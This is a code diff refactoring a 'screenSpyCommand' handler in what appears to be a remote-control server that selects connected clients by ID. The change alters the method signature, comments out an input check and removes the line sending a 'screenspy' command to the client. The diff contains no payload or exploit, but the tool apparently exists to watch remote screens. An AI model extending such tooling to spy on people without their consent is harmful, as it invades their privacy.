@@ -50,27 +50,23 @@ class screenSpyCommand(CommandBase):
     isRunning = False
     tkObject = None
 
-    def execute(self, netServer: "NetterServer", *args) -> "NetterClient":
+    def execute(self, netServer: "NetterServer", clientID: str) -> "NetterClient":
         if self.isRunning:
             netServer.console_log("Screen spying is already running", level="ERROR")
             return
 
-        if not args and not netServer.selectedClient:
-            # netServer.console_log('No client selected', level = 'ERROR')
-            netServer.inputHandler.handle("help spy")
-            return
+        # if not args and not netServer.selectedClient:
+        #     # netServer.console_log('No client selected', level = 'ERROR')
+        #     netServer.inputHandler.handle("help spy")
+        #     return
 
-        selectedClient = netServer.selectedClient if netServer.selectedClient else netServer.get(UUID=args[0])
+        selectedClient = netServer.selectedClient if netServer.selectedClient else netServer.get(UUID=clientID)
 
         if selectedClient is None:
             netServer.console_log("Provided client does not exist.", level="ERROR")
             return
 
         self.isRunning = True
-        selectedClient.socket_.send_(packetType=PacketType.COMMAND, data="screenspy")
-
-        # self.tkObject = tkinterWindow()
-        # self.tkObject.mainloop()
 
         def on_close():
             self.isRunning = False
